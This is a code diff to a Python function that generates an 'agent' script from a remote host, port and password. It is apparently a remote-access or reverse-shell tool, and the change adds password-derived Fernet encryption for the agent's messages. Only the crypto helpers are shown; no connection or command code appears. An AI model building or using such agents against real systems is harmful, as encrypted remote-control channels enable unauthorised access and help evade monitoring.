@@ -7,9 +7,50 @@ def writeAgent(output, rhost, rport, password):
     agent  = '''
 import os
 import socket
+import base64
 import hashlib
 import threading
 import subprocess
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.backends import default_backend
+
+
+def getKey(password):
+
+    password = password.encode()
+    
+    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
+    digest.update(password)
+
+    key = base64.urlsafe_b64encode(digest.finalize())
+
+    return key
+
+
+
+def encryptMessage(plainText, password):
+
+    key = getKey(password)
+    plainText = plainText.encode()
+    f = Fernet(key)
+
+    encrypted = f.encrypt(plainText)
+
+    return encrypted.decode()
+
+
+
+def decryptMessage(cipherText, password):
+    
+    key = getKey(password)
+    cipherText = cipherText.encode()
+    f = Fernet(key)
+
+    decrypted = f.decrypt(cipherText)
+
+    return decrypted.decode()
+
 
 
 def passwordChallenge(channel, passwd):
